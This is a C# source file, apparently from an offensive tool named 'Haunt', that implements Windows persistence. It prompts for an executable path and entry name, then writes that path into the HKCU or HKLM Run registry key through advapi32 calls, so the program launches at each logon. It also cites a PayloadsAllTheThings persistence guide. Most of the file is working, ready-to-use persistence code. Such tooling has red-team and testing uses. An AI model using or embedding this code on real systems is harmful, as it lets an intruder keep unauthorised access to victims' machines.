using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Haunt.Method
{
    public class RegistryEntry
    {
        // Define the necessary constants dynamically using reflection
        static readonly uint HKEY_CURRENT_USER = 0x80000001;
        static readonly uint HKEY_LOCAL_MACHINE = 0x80000002;
        static readonly int KEY_WRITE = 0x00020006;

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegOpenKeyEx(uint hKey, string subKey, int ulOptions, int samDesired, out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegSetValueEx(IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, string lpData, int cbData);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(IntPtr hKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCreateKeyEx(uint hKey, string lpSubKey, int Reserved, string lpClass, int dwOptions, int samDesired, IntPtr lpSecurityAttributes, out IntPtr phkResult, out int lpdwDisposition);

        public RegistryEntry(int method) 
        {
            Console.Write("Please enter the full path to the executable you would like to persist: ");
            string path = Console.ReadLine();

            string name = "";
            string sub = "";
            bool userLevel = true;

            switch(method)
            {
                //Run Key User
                case 1:
                    Console.WriteLine("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md#registry-hkcu");
                    sub = @"Software\Microsoft\Windows\CurrentVersion\Run\";
                    Console.Write("\n\nPlease enter a name for your registry entry. (Does not need to be the same as the exe) ");
                    name = Console.ReadLine();
                    userLevel = true;
                    break;
                //Run Key Admin
                case 2:
                    sub = @"Software\Microsoft\Windows\CurrentVersion\Run\";
                    Console.Write("\n\nPlease enter a name for your registry entry. (Does not need to be the same as the exe) ");
                    name = Console.ReadLine();
                    userLevel = false;
                    break;
                default:
                    Console.WriteLine("Invalid input, please try again with a selection indexed on the list.");
                    break;
            }

            WriteToRegistry(sub, name, @path, userLevel);
        }

        public void WriteToRegistry(string sub, string valName, string valData, bool userLevel)
        {
            string subKey = sub;
            string valueName = valName;
            string valueData = valData;

            uint hkey = 0;

            if(userLevel == true)
            {
                hkey = HKEY_CURRENT_USER;
            } 
            else
            {
                hkey = HKEY_LOCAL_MACHINE;
            }

            try
            {
                IntPtr hKey = CreateOrOpenRegistryKey(hkey, subKey);
                if (hKey != IntPtr.Zero)
                {
                    if (SetValueInRegistry(hKey, valueName, RegistryValueKind.String, valueData))
                    {
                        Console.WriteLine("Value written to the Registry successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Error writing to the Registry.");
                    }

                    CloseRegistryKey(hKey);
                }
                else
                {
                    Console.WriteLine("Error opening Registry key.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static IntPtr CreateOrOpenRegistryKey(uint hKey, string subKey)
        {
            IntPtr hKeyResult;
            int lpdwDisposition;

            int result = RegCreateKeyEx(hKey, subKey, 0, null, 0, KEY_WRITE, IntPtr.Zero, out hKeyResult, out lpdwDisposition);
            if (result != 0)
            {
                return IntPtr.Zero;
            }
            return hKeyResult;
        }

        static bool SetValueInRegistry(IntPtr hKey, string valueName, RegistryValueKind valueKind, string valueData)
        {
            int result = RegSetValueEx(hKey, valueName, 0, valueKind, valueData, valueData.Length * 2);
            return result == 0;
        }

        static void CloseRegistryKey(IntPtr hKey)
        {
            RegCloseKey(hKey);
        }
    }
}
